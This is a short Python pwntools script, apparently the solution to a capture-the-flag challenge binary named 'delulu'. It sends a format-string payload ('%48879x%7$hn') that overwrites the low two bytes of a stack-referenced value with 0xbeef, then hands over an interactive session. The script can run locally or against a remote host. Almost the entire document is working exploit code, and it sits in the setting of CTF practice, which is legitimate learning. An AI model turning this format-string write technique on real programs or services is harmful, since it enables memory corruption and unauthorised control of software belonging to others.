from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript='''
init-pwndbg
b *main+138
continue
'''.format(**locals())

exe = './delulu'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context.terminal = 'kitty'

io = start()

# The 7th offset contain the location where 0x1337babe stored
# We just need to edit the 2 LSB to 0xbeef
# 0xbeef = 48879

payload = b"%48879x" + b"%7$hn"

io.sendlineafter(b">> ", payload)
io.interactive()
